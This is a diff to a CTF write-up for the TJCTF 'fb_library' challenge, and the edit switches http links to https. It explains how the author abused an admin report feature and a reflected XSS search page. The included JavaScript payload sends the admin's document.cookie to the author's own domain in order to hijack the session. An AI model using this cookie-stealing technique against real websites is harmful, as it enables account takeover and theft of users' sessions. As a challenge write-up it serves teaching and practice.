@@ -12,7 +12,7 @@ Here was the description:
 
 The [linked website](https://fb_library.tjctf.org/) had a login and registration system that then allowed you to view a catalog of books and then report them to the admin. When you reported, you would go to `/report?url=<book url>` with a success message. We realized we could make it `report` any valid url and it would then open a get request to that url
 
-So for example, when I reported my website [http://uzpg.me](http://uzpg.me), I noticed a new GET request with a User-Agent `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/80.0.3987.0 Safari/537.36`. The most important part here is the **HeadlessChrome** part which is a [Headless Browser](https://en.wikipedia.org/wiki/Headless_browser). A headless browser is an automated way of using a browser without human action.
+So for example, when I reported my website [https://uzpg.me](https://uzpg.me), I noticed a new GET request with a User-Agent `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/80.0.3987.0 Safari/537.36`. The most important part here is the **HeadlessChrome** part which is a [Headless Browser](https://en.wikipedia.org/wiki/Headless_browser). A headless browser is an automated way of using a browser without human action.
 
 This meant that we could try and access the cookies and data of this headless browser instance to compromise the `fb_library`. Indeed, the login system we noticed above had a `session` cookie that would log you in. This meant that if we could steal the value of that cookie, we would have admin access.
 
@@ -27,7 +27,7 @@ My teammate [Techno-Disaster](https://technodisaster.wtf) 	scoured the web and f
 So our trick was to make it go to our website and then have a script that would change the `window.name` property to our payload, and then redirect it to the vulnerable search page by setting the query parameter to `<script>eval(name)`. This evaluates our payload stored in the `window.name` property and executes our cookie stealing payload.
 
 ```js
-window.name = "window.location = 'http://uzpg.me/' + document.cookie;";
+window.name = "window.location = 'https://uzpg.me/' + document.cookie;";
 location = "https://fb_library.tjctf.org/search?q=<script>eval(name)/*"";
 ```
 
